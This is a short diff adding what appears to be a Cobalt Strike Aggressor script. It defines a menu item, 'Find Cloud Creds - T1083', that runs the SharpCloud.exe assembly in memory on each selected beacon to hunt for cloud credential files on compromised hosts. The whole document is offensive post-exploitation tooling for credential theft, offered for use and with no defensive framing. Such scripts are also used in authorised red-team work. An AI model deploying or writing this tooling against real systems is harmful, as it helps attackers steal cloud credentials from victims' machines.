@@ -1,0 +1,13 @@
+#Find Cloud Credential Files
+item "Find Cloud Creds  - T1083"{
+	local('$bid');
+		foreach $bid ($1){
+			cloudcreds($bid);
+			}
+		}
+		
+		
+# Cloud Creds
+sub cloudcreds{
+bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
+}
